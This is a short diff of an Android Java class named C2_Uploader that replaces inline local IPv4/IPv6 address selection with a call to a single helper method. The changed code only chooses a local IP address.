@@ -30,16 +30,7 @@ public class C2_Uploader {
     }
 
     private static String getIpForRenderC2(Context context) {
-        String v4 = MainActivity.getLocalIpAddress();
-        if (v4 != null && !v4.trim().isEmpty() && !"127.0.0.1".equals(v4) && !"Unknown".equalsIgnoreCase(v4)) {
-            return v4;
-        }
-        // Fallback to IPv6 if IPv4 is unavailable
-        String v6 = MainActivity.getLocalIPv6Address();
-        if (v6 != null && !v6.trim().isEmpty() && !"127.0.0.1".equals(v6)) {
-            return v6;
-        }
-        return "127.0.0.1";
+        return MainActivity.getBestIpForConnection(context);
     }
 
     /**
